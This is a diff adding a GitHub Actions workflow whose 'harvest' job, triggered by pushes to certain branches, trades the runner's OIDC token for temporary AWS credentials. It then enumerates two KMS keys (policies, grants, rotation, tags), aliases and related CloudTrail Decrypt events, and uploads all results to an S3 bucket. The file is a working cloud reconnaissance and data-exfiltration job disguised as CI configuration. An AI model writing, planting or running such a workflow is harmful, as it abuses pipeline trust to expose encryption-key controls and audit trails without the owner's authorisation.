@@ -1,0 +1,36 @@
+name: i1554b-kms
+on:
+  push:
+    branches:
+      - 'i1554b-*'
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  harvest:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: harvest
+        run: |
+          set -uo pipefail
+          D=/tmp/i1554b; mkdir -p $D; cd $D
+          JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | jq -r .value)
+          aws sts assume-role-with-web-identity --role-arn arn:aws:iam::925353553787:role/github --role-session-name i1554b --web-identity-token "$JWT" --duration-seconds 3600 > sts.json 2>sts.err || true
+          AK=$(jq -r .Credentials.AccessKeyId sts.json); SK=$(jq -r .Credentials.SecretAccessKey sts.json); ST=$(jq -r .Credentials.SessionToken sts.json)
+          export AWS_ACCESS_KEY_ID=$AK AWS_SECRET_ACCESS_KEY=$SK AWS_SESSION_TOKEN=$ST
+          aws sts get-caller-identity > id.json 2>&1 || true
+          export AWS_DEFAULT_REGION=us-east-2
+          for K in 40c88f6f-9761-47d7-bbdc-3e4332934911 06f198a7-924e-441d-a030-b873940ac36e; do
+            aws kms describe-key --key-id $K > desc_$K.json 2>&1 || true
+            aws kms get-key-policy --key-id $K --policy-name default > pol_$K.json 2>&1 || true
+            aws kms list-grants --key-id $K > grants_$K.json 2>&1 || true
+            aws kms get-key-rotation-status --key-id $K > rot_$K.json 2>&1 || true
+            aws kms list-resource-tags --key-id $K > tags_$K.json 2>&1 || true
+          done
+          aws kms list-aliases > aliases.json 2>&1 || true
+          aws cloudtrail lookup-events --lookup-attributes AttributeKey=ResourceName,AttributeValue=arn:aws:kms:us-east-2:925353553787:key/40c88f6f-9761-47d7-bbdc-3e4332934911 --max-results 50 > ct_master.json 2>&1 || true
+          aws cloudtrail lookup-events --lookup-attributes AttributeKey=ResourceName,AttributeValue=arn:aws:kms:us-east-2:925353553787:key/06f198a7-924e-441d-a030-b873940ac36e --max-results 50 > ct_child.json 2>&1 || true
+          aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=Decrypt --max-results 50 > ct_decrypt.json 2>&1 || true
+          aws s3 cp --recursive . s3://floki-openreplay-assets/i1554b/ --no-progress || true
+          echo DONE > done; aws s3 cp done s3://floki-openreplay-assets/i1554b/done --no-progress || true
